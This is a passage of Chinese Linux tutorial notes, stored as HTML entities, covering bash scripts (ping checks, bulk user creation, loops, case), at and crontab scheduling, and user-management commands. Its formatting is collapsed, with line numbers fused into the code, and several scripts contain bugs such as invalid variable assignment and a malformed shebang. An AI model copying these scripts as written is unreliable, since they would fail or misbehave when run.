&#x6B21;&#x5C31;&#x7ED3;&#x675F;&#xFF0C;&#x56E0;&#x6B64;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x7528;&#x6237;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x8FC7;&#x957F;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;-c &#x53C2;&#x6570;&#x6765;&#x89C4;&#x5B9A;&#x5C1D;&#x8BD5;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;-i &#x53C2;&#x6570;&#x5B9A;&#x4E49;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x7684;&#x53D1;&#x9001;&#x95F4;&#x9694;&#xFF0C;&#x4EE5;&#x53CA;&#x4F7F;&#x7528;-W &#x53C2;&#x6570;&#x5B9A;&#x4E49;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#x3002; 12345678910#!/bin/bashping -c 3 -i 0.2 -w 3 $1 &amp;&gt; /dev/nullif [ $? -eq 0 ]thenecho &quot;Host $1 is On-line.&quot;elseecho &quot;Host $1 is Off-line&quot;fiTest:bash chkhost.sh 192.168.10.10 read &#x662F;&#x7528;&#x6765;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x8F93;&#x5165;&#x4FE1;&#x606F;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x80FD;&#x591F;&#x628A;&#x63A5;&#x6536;&#x5230;&#x7684;&#x7528;&#x6237;&#x8F93;&#x5165;&#x4FE1;&#x606F;&#x8D4B;&#x503C;&#x7ED9;&#x540E;&#x9762;&#x7684;&#x6307;&#x5B9A;&#x53D8;&#x91CF;&#xFF0C;-p &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5411;&#x7528;&#x6237;&#x663E;&#x793A;&#x4E00;&#x5B9A;&#x7684;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x3002; 12#!/bin/bashread -p &quot;Enter your score (0-100): &quot; GRADE for &#x6761;&#x4EF6;&#x5FAA;&#x73AF;&#x8BED;&#x53E5;&#xFF1A; 1234for &#x53D8;&#x91CF;&#x540D; in &#x53D6;&#x503C;&#x5217;&#x8868;do &#x547D;&#x4EE4;&#x5E8F;&#x5217;done &#x6765;&#x7F16;&#x5199; Shell &#x811A;&#x672C; Example.sh&#x3002;&#x5728;&#x811A;&#x672C;&#x4E2D;&#x4F7F;&#x7528; read &#x547D;&#x4EE4;&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5BC6;&#x7801;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x8D4B;&#x503C;&#x7ED9; PASSWD &#x53D8;&#x91CF;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;-p &#x53C2;&#x6570;&#x5411;&#x7528;&#x6237;&#x663E;&#x793A;&#x4E00;&#x6BB5;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#xFF0C;&#x544A;&#x8BC9;&#x7528;&#x6237;&#x6B63;&#x5728;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x5373;&#x5C06;&#x4F5C;&#x4E3A;&#x8D26;&#x6237;&#x5BC6;&#x7801;&#x3002;&#x5728;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x4F7F;&#x7528;&#x4ECE;&#x5217;&#x8868;&#x6587;&#x4EF6; users.txt &#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x6240;&#x6709;&#x7684;&#x7528;&#x6237;&#x540D;&#x79F0;&#xFF0C;&#x7136;&#x540E;&#x9010;&#x4E00;&#x4F7F;&#x7528;&#x201C;id &#x7528;&#x6237;&#x540D;&#x201D;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x7528;&#x6237;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;$?&#x5224;&#x65AD;&#x8FD9;&#x6761;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x6267;&#x884C;&#x6210;&#x529F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5224;&#x65AD;&#x8BE5;&#x7528;&#x6237;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x3002; /dev/null &#x662F;&#x4E00;&#x4E2A;&#x88AB;&#x79F0;&#x4F5C; Linux &#x9ED1;&#x6D1E;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7B49;&#x540C;&#x4E8E;&#x5220;&#x9664;&#x6570;&#x636E;&#xFF08;&#x7C7B;&#x4F3C;&#x4E8E;&#x6CA1;&#x6709;&#x56DE;&#x6536;&#x529F;&#x80FD;&#x7684;&#x5783;&#x573E;&#x7BB1; 123456789101112131415161718192021#/bin/bashread -p &quot;Enter The Users Password : &quot; PASSWDfor UNAME in `cat users.txt`doid $UNAME &amp;&gt; /dev/nullif [ $? -eq 0 ]thenecho &quot;Already exists&quot;elseuseradd $UNAME &amp;&gt; /dev/null## &#x5B58;&#x5728;&#x7591;&#x95EE;echo &quot;$PASSWD&quot; | passwd --stdin $UNAME &amp;&gt; /dev/null## passwd --stdin? &#x8FD9;&#x662F;&#x4E00;&#x6761;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x4E3A;$UNAME&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x4E3A;$PSSWD&#x3002;if [ $? -eq 0 ]thenecho &quot;$UNAME, Create success&quot;elseecho &quot;$UNAME, Create failure&quot;fifidone &#x8BA9;&#x811A;&#x672C;&#x4ECE;&#x6587;&#x672C;&#x4E2D;&#x81EA;&#x52A8;&#x8BFB;&#x53D6;&#x4E3B;&#x673A;&#x5217;&#x8868;&#xFF0C;&#x7136;&#x540E;&#x81EA;&#x52A8;&#x9010;&#x4E2A;&#x6D4B;&#x8BD5;&#x8FD9;&#x4E9B;&#x4E3B;&#x673A;&#x662F;&#x5426;&#x5728;&#x7EBF;&#x3002; 123456789101112131415#!/bin/bashHLIST = $(cat ~/ipadds.txt)for IP in $HLISTdoping -c 3 -i 0.2 -w 3 $IP &amp;&gt; /dev/nullif [ $? -eq 0 ] ; thenecho &quot;Host $IP is On-line.&quot;elseecho &quot;Host $IP is Off-line.&quot;fidone192.168.10.10192.168.10.11192.168.10.12 while &#x6761;&#x4EF6;&#x5FAA;&#x73AF;&#x8BED;&#x53E5; 12345678910111213141516171819202122232425while &#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C;do &#x547D;&#x4EE4;&#x5E8F;&#x5217;doneexit 0 &#x9000;&#x51FA;&#x5FAA;&#x73AF;#!/bin/bashPRICE=$(expr $RANDOM % 1000)TIMES=0echo &quot;&#x5546;&#x54C1;&#x5B9E;&#x9645;&#x4EF7;&#x683C;&#x4E3A; 0-999 &#x4E4B;&#x95F4;&#xFF0C;&#x731C;&#x731C;&#x770B;&#x662F;&#x591A;&#x5C11;&#xFF1F;&quot;while truedoread -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x60A8;&#x731C;&#x6D4B;&#x7684;&#x4EF7;&#x683C;&#x6570;&#x76EE;&#xFF1A;&quot; INTlet TIMES++if [ $INT -eq $PRICE ] ; thenecho &quot;&#x606D;&#x559C;&#x60A8;&#x7B54;&#x5BF9;&#x4E86;&#xFF0C;&#x5B9E;&#x9645;&#x4EF7;&#x683C;&#x662F; $PRICE&quot;echo &quot;&#x60A8;&#x603B;&#x5171;&#x731C; g $TIMES &#x6B21;&quot;exit 0elif [ $INT -gt $PRICE ] ; thenecho &quot;&#x592A;&#x9AD8;&#x4E86;&#xFF01;&quot;elseecho &quot;&#x592A;&#x4F4E;&#x4E86;&#xFF01;&quot;fidone case &#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5; 12345678910111213141516171819202122232425262728293031323334case &#x53D8;&#x91CF;&#x503C; in&#x6A21;&#x5F0F;1) &#x547D;&#x4EE4;&#x5E8F;&#x5217; 1 ;;&#x6A21;&#x5F0F;2) &#x547D;&#x4EE4;&#x5E8F;&#x5217; 2 ;; ......*) &#x9ED8;&#x8BA4;&#x547D;&#x4EE4;&#x5E8F;&#x5217;esac#!/bin/bashread -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x6309; Enter &#x952E;&#x786E;&#x8BA4;&#xFF1A;&quot; KEYcase &quot;$KEY&quot; in[a-z]|[A-Z])echo &quot;&#x60A8;&#x8F93;&#x5165;&#x7684;&#x662F; &#x5B57;&#x6BCD;&#x3002;&quot;;;[0-9])echo &quot;&#x60A8;&#x8F93;&#x5165;&#x7684;&#x662F; &#x6570;&#x5B57;&#x3002;&quot;;;*)echo &quot;&#x60A8;&#x8F93;&#x5165;&#x7684;&#x662F; &#x7A7A;&#x683C;&#x3001;&#x529F;&#x80FD;&#x952E;&#x6216;&#x5176;&#x4ED6;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#x3002;&quot;esac[root@linuxprobe ~]# bash Checkkeys.sh&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x6309; Enter &#x952E;&#x786E;&#x8BA4;&#xFF1A;6&#x60A8;&#x8F93;&#x5165;&#x7684;&#x662F; &#x6570;&#x5B57;&#x3002;[root@linuxprobe ~]# bash Checkkeys.sh&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x6309; Enter &#x952E;&#x786E;&#x8BA4;&#xFF1A;p&#x60A8;&#x8F93;&#x5165;&#x7684;&#x662F; &#x5B57;&#x6BCD;&#x3002;[root@linuxprobe ~]# bash Checkkeys.sh&#x8BF7;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x6309; Enter &#x952E;&#x786E;&#x8BA4;&#xFF1A;^[[15~&#x60A8;&#x8F93;&#x5165;&#x7684;&#x662F; &#x7A7A;&#x683C;&#x3001;&#x529F;&#x80FD;&#x952E;&#x6216;&#x5176;&#x4ED6;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#x3002; &#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;12345at &#x65F6;&#x95F4;&#x67E5;&#x770B;&#x5DF2;&#x8BBE;&#x7F6E;&#x597D;&#x4F46;&#x8FD8;&#x672A;&#x6267;&#x884C;&#x7684;&#x4E00;&#x6B21;&#x6027;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF1A; at -l&#x5220;&#x9664;&#xFF1A; atrm &#x4EFB;&#x52A1;&#x5E8F;&#x53F7; &#x5C06;&#x7CFB;&#x7EDF;&#x8BBE;&#x7F6E;&#x4E3A;&#x5728;&#x4ECA;&#x665A; 23:30 &#x5206;&#x81EA;&#x52A8;&#x91CD;&#x542F;&#x7F51;&#x7AD9;&#x670D;&#x52A1;&#x3002; 1234567at 23:30at &gt; systemctl restart httpdat &gt; &#x6B64;&#x5904;&#x8BF7;&#x540C;&#x65F6;&#x6309;&#x4E0B; Ctrl + D &#x7EC4;&#x5408;&#x952E;&#x6765;&#x7ED3;&#x675F;&#x7F16;&#x5199;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;echo &quot;systemctl restart httpd&quot; | at 23:30 &#x80FD;&#x591F;&#x5468;&#x671F;&#x6027;&#x5730;&#x3001;&#x6709;&#x89C4;&#x5F8B;&#x5730;&#x6267;&#x884C;&#x67D0;&#x4E9B;&#x5177;&#x4F53;&#x7684;&#x4EFB;&#x52A1;&#xFF1A; 1234567891011121314151617181920&#x521B;&#x5EFA;&#x3001;&#x7F16;&#x8F91;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#x201C;crontab -e&#x201D;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#x201C;crontab -l&#x201D;&#x5220;&#x9664;&#x67D0;&#x6761;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#x201C;crontab -r&#x201D;&#x5982;&#x679C;&#x60A8;&#x662F;&#x4EE5;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5728; crontab &#x547D;&#x4EE4;&#x4E2D;&#x52A0;&#x4E0A;-u &#x53C2;&#x6570;&#x6765;&#x7F16;&#x8F91;&#x4ED6;&#x4EBA;&#x7684;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x3002;&#x5728; crond &#x670D;&#x52A1;&#x7684;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x53C2;&#x6570;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x547D;&#x4EE4;&#x4E00;&#x5B9A;&#x8981;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5199;&#x5982;&#x679C;&#x4E0D;&#x77E5;&#x9053;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x8BF7;&#x7528; whereis &#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;rm &#x547D;&#x4EE4;&#x8DEF;&#x5F84;&#x4E3A;&#x4E0B;&#x9762;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x52A0;&#x7C97;&#x90E8;&#x5206;&#x3002;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;&#x5206;&#x3001;&#x65F6;&#x3001;&#x65E5;&#x3001;&#x6708;&#x3001;&#x661F;&#x671F; &#x547D;&#x4EE4;(&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E9B;&#x5B57;&#x6BB5;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x661F;&#x53F7;&#xFF08;*&#xFF09;&#x5360;&#x4F4D;)&#x4F7F;&#x7528; crond &#x8BBE;&#x7F6E;&#x4EFB;&#x52A1;&#x7684;&#x53C2;&#x6570;&#x5B57;&#x6BB5;&#x8BF4;&#x660E;:&#x5206; &#x53D6;&#x503C;&#x4E3A; 0&#xFF5E;59 &#x7684;&#x6574;&#x6570;&#x65F6; &#x53D6;&#x503C;&#x4E3A; 0&#xFF5E;23 &#x7684;&#x4EFB;&#x610F;&#x6574;&#x6570;&#x65E5; &#x53D6;&#x503C;&#x4E3A; 1&#xFF5E;31 &#x7684;&#x4EFB;&#x610F;&#x6574;&#x6570;&#x6708; &#x53D6;&#x503C;&#x4E3A; 1&#xFF5E;12 &#x7684;&#x4EFB;&#x610F;&#x6574;&#x6570;&#x661F;&#x671F; &#x53D6;&#x503C;&#x4E3A; 0&#xFF5E;7 &#x7684;&#x4EFB;&#x610F;&#x6574;&#x6570;&#xFF0C;&#x5176;&#x4E2D; 0 &#x4E0E; 7 &#x5747;&#x4E3A;&#x661F;&#x671F;&#x65E5;&#x547D;&#x4EE4; &#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x6216;&#x7A0B;&#x5E8F;&#x811A;&#x672C; &#x5047;&#x8BBE;&#x5728;&#x6BCF;&#x5468;&#x4E00;&#x3001;&#x4E09;&#x3001;&#x4E94;&#x7684;&#x51CC;&#x6668; 3 &#x70B9; 25 &#x5206;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x4F7F;&#x7528; tar &#x547D;&#x4EE4;&#x628A;&#x67D0;&#x4E2A;&#x7F51;&#x7AD9;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x6253;&#x5305;&#x5904;&#x7406;&#xFF0C;&#x4F7F;&#x5176;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x3002; 123crontab -eno crontab for root - using an empty onecrontab: installing new crontab &#x9700;&#x8981;&#x8BF4;&#x660E;&#x7684;&#x662F;&#xFF0C;&#x9664;&#x4E86;&#x7528;&#x9017;&#x53F7;&#xFF08;,&#xFF09;&#x6765;&#x5206;&#x522B;&#x8868;&#x793A;&#x591A;&#x4E2A;&#x65F6;&#x95F4;&#x6BB5;&#xFF0C;&#x4F8B;&#x5982;&#x201C;8,9,12&#x201D;&#x8868;&#x793A; 8 &#x6708;&#x3001;9 &#x6708;&#x548C; 12 &#x6708;&#x3002;&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x51CF;&#x53F7;&#xFF08;-&#xFF09;&#x6765;&#x8868;&#x793A;&#x4E00;&#x6BB5;&#x8FDE;&#x7EED;&#x7684;&#x65F6;&#x95F4;&#x5468;&#x671F;&#xFF08;&#x4F8B;&#x5982;&#x5B57;&#x6BB5;&#x201C;&#x65E5;&#x201D;&#x7684;&#x53D6;&#x503C;&#x4E3A;&#x201C;12-15&#x201D;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x6BCF;&#x6708;&#x7684; 12&#xFF5E;15 &#x65E5;&#xFF09;&#x3002;&#x4EE5;&#x53CA;&#x7528;&#x9664;&#x53F7;&#xFF08;/&#xFF09;&#x8868;&#x793A;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#x7684;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#xFF08;&#x4F8B;&#x5982;*/2&#x8868;&#x793A;&#x6BCF;&#x9694;2 &#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x4EFB;&#x52A1;&#xFF09; &#x5982;&#x679C;&#x5728; crond &#x670D;&#x52A1;&#x4E2D;&#x9700;&#x8981;&#x540C;&#x65F6;&#x5305;&#x542B;&#x591A;&#x6761;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#x8BED;&#x53E5;&#xFF0C;&#x5E94;&#x6BCF;&#x884C;&#x4EC5;&#x5199;&#x4E00;&#x6761;&#x3002; &#x6BCF;&#x5468;&#x4E00;&#x81F3;&#x5468;&#x4E94;&#x7684;&#x51CC;&#x6668; 1 &#x70B9;&#x949F;&#x81EA;&#x52A8;&#x6E05;&#x7A7A;/tmp &#x76EE;&#x5F55;&#x5185;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x3002; 12345whereis emcrontab -ecrontab -l25 3 * * 1,3,5 /usr/bin/tar -czvf backup.tar.gz /home/wwwroot0 1 * * 1-5 /usr/bin/rm -rf /tmp/* &#x7B2C;&#x4E94;&#x7AE0;,&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x4E0E;&#x6587;&#x4EF6;&#x6743;&#x9650;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x4E0E;&#x80FD;&#x529B; useradd &#x547D;&#x4EE4; useradd &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x65B0;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;useradd [&#x9009;&#x9879;] &#x7528;&#x6237;&#x540D;&#x201D;&#x3002; 1234567-d &#x6307;&#x5B9A;&#x7528;&#x6237;&#x7684;&#x5BB6;&#x76EE;&#x5F55;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;/home/username&#xFF09;-e &#x8D26;&#x6237;&#x7684;&#x5230;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A; YYYY-MM-DD.-u &#x6307;&#x5B9A;&#x8BE5;&#x7528;&#x6237;&#x7684;&#x9ED8;&#x8BA4; UID-g &#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x521D;&#x59CB;&#x7684;&#x7528;&#x6237;&#x57FA;&#x672C;&#x7EC4;&#xFF08;&#x5FC5;&#x987B;&#x5DF2;&#x5B58;&#x5728;&#xFF09;-G &#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x6269;&#x5C55;&#x7528;&#x6237;&#x7EC4;-N &#x4E0D;&#x521B;&#x5EFA;&#x4E0E;&#x7528;&#x6237;&#x540C;&#x540D;&#x7684;&#x57FA;&#x672C;&#x7528;&#x6237;&#x7EC4;-s &#x6307;&#x5B9A;&#x8BE5;&#x7528;&#x6237;&#x7684;&#x9ED8;&#x8BA4; Shell &#x89E3;&#x91CA;&#x5668; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7528;&#x6237;&#x5E76;&#x6307;&#x5B9A;&#x5BB6;&#x76EE;&#x5F55;&#x7684;&#x8DEF;&#x5F84;&#x3001;&#x7528;&#x6237;&#x7684; UID &#x4EE5;&#x53CA; Shell &#x89E3;&#x91CA;&#x5668;&#x3002;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x4E2D;&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;/sbin/nologin&#xFF0C;&#x5B83;&#x662F;&#x7EC8;&#x7AEF;&#x89E3;&#x91CA;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x5458;&#xFF0C;&#x4E0E; Bash &#x89E3;&#x91CA;&#x5668;&#x6709;&#x7740;&#x5929;&#x58E4;&#x4E4B;&#x522B;&#x3002;&#x4E00;&#x65E6;&#x7528;&#x6237;&#x7684;&#x89E3;&#x91CA;&#x5668;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A; nologin&#xFF0C;&#x5219;&#x4EE3;&#x8868;&#x8BE5;&#x7528;&#x6237;&#x4E0D;&#x80FD;&#x767B;&#x5F55;&#x5230;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF1A; 12useradd -d /home/linux -u 8888 -s /sbin/nologin linuxtestid linuxtest groupadd &#x547D;&#x4EE4; groupadd &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x7528;&#x6237;&#x7EC4;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;groupadd [&#x9009;&#x9879;] &#x7FA4;&#x7EC4;&#x540D;&#x201D;&#x3002; groupadd ronny usermod &#x547D;&#x4EE4; usermod &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;usermod [&#x9009;&#x9879;] &#x7528;&#x6237;&#x540D;&#x201D;&#x3002; 123456789-c &#x586B;&#x5199;&#x7528;&#x6237;&#x8D26;&#x6237;&#x7684;&#x5907;&#x6CE8;&#x4FE1;&#x606F;-d -m &#x53C2;&#x6570;-m &#x4E0E;&#x53C2;&#x6570;-d &#x8FDE;&#x7528;&#xFF0C;&#x53EF;&#x91CD;&#x65B0;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x7684;&#x5BB6;&#x76EE;&#x5F55;&#x5E76;&#x81EA;&#x52A8;&#x628A;&#x65E7;&#x7684;&#x6570;&#x636E;&#x8F6C;&#x79FB;&#x8FC7;&#x53BB;-e &#x8D26;&#x6237;&#x7684;&#x5230;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A; YYYY-MM-DD-g &#x53D8;&#x66F4;&#x6240;&#x5C5E;&#x7528;&#x6237;&#x7EC4;-G &#x53D8;&#x66F4;&#x6269;&#x5C55;&#x7528;&#x6237;&#x7EC4;-L &#x9501;&#x5B9A;&#x7528;&#x6237;&#x7981;&#x6B62;&#x5176;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;-U &#x89E3;&#x9501;&#x7528;&#x6237;&#xFF0C;&#x5141;&#x8BB8;&#x5176;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;-s &#x53D8;&#x66F4;&#x9ED8;&#x8BA4;&#x7EC8;&#x7AEF;-u &#x4FEE;&#x6539;&#x7528;&#x6237;&#x7684; UID &#x540E;&#x5C06;&#x7528;&#x6237; linuxprobe &#x52A0;&#x5165;&#x5230; root &#x7528;&#x6237;&#x7EC4;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x6269;&#x5C55;&#x7EC4;&#x5217;&#x8868;&#x4E2D;&#x5219;&#x4F1A;&#x51FA;&#x73B0; root &#x7528;&#x6237;&#x7EC4;&#x7684;&#x5B57;&#x6837;&#xFF0C;&#x800C;&#x57FA;&#x672C;&#x7EC4;&#x4E0D;&#x4F1A;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x3002; usermod -G root linuxprobe &#x7528;-u &#x53C2;&#x6570;&#x4FEE;&#x6539; linuxprobe &#x7528;&#x6237;&#x7684; UID &#x53F7;&#x7801;&#x503C;&#x3002; usermod -u 8888 linuxprobe passwd &#x547D;&#x4EE4; passwd &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x3001;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x3001;&#x8BA4;&#x8BC1;&#x4FE1;&#x606F;&#x7B49;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;passwd [&#x9009;&#x9879;] [&#x7528;&#x6237;&#x540D;]&#x3002; 12345678910-l &#x9501;&#x5B9A;&#x7528;&#x6237;&#xFF0C;&#x7981;&#x6B62;&#x5176;&#x767B;&#x5F55;-u &#x89E3;&#x9664;&#x9501;&#x5B9A;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x767B;&#x5F55;--stdin &#x5141;&#x8BB8;&#x901A;&#x8FC7;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x5BC6;&#x7801;&#xFF0C;&#x5982; echo &quot;NewPassWord&quot; | passwd --stdinUsername-d &#x4F7F;&#x8BE5;&#x7528;&#x6237;&#x53EF;&#x7528;&#x7A7A;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;-e &#x5F3A;&#x5236;&#x7528;&#x6237;&#x5728;&#x4E0B;&#x6B21;&#x767B;&#x5F55;&#x65F6;&#x4FEE;&#x6539;&#x5BC6;&#x7801;-S &#x663E;&#x793A;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x662F;&#x5426;&#x88AB;&#x9501;&#x5B9A;&#xFF0C;&#x4EE5;&#x53CA;&#x5BC6;&#x7801;&#x6240;&#x91C7;&#x7528;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x540D;&#x79F0;&#x4FEE;&#x6539;&#x81EA;&#x5DF1;&#x7684;&#x5BC6;&#x7801;&#xFF1A;passwd&#x4FEE;&#x6539;&#x522B;&#x4EBA;&#x7684;&#x5BC6;&#x7801;&#xFF1A;passwd linuxprobe&#x9501;&#x5B9A;&#x522B;&#x4EBA;&#x7684;&#x8D26;&#x53F7;&#xFF1A;passwd -l linuxprobe userdel &#x547D;&#x4EE4; userdel &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5220;&#x9664;&#x7528;&#x6237;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;userdel [&#x9009;&#x9879;] &#x7528;&#x6237;&#x540D;&#x201D;&#x3002; 12-f &#x5F3A;&#x5236;&#x5220;&#x9664;&#x7528;&#x6237;-r &#x540C;&#x65F6;&#x5220;&#x9664;&#x7528;&#x6237;&#x53CA;&#x7528;&#x6237;&#x5BB6;&#x76EE;&#x5F55; &#x6587;&#x4EF6;&#x6743;&#x9650;&#x4E0E;&#x5F52;&#x5C5E;Linux&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF1A; 1234567891011-&#xFF1A;&#x666E;&#x901A;&#x6587;&#x4EF6;&#x3002;d&#xFF1A;&#x76EE;&#x5F55;&#x6587;&#x4EF6;&#x3002;l&#xFF1A;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x3002;b&#xFF1A;&#x5757;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x3002;c&#xFF1A;&#x5B57;&#x7B26;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x3002;p&#xFF1A;&#x7BA1;&#x9053;&#x6587;&#x4EF6;&#x3002;&#x53EF;&#x8BFB;&#xFF08;r&#xFF09;&#x3001;&#x53EF;&#x5199;&#xFF08;w&#xFF09;&#x3001;&#x53EF;&#x6267;&#x884C;&#xFF08;x&#xFF09;&#x5206;&#x522B;&#x7528;&#x6570;&#x5B57; 4&#x3001;2&#x3001;1 